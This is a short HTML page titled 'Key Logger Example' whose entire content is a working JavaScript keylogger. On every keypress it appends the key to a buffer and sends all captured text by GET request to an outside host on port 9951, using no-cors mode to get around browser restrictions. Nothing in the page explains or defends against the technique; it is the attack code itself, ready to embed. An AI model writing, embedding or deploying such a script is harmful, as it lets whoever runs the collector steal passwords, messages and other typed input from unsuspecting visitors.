<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Key Logger Example</title>
</head>
<body>
    <h1>Key Logger</h1>
    <script type="text/javascript">
      var l = "";
      document.onkeypress = function (e) {
        l += e.key;
        fetch(`https://mesh.locallhost.cloud:9951/KeyLogger?data=${encodeURIComponent(l)}`, {
          method: "GET",
          mode: "no-cors" // Sử dụng chế độ no-cors để tránh vấn đề CORS
        }).catch(error => console.log('Fetch error:', error));
      };
    </script>
</body>
</html>
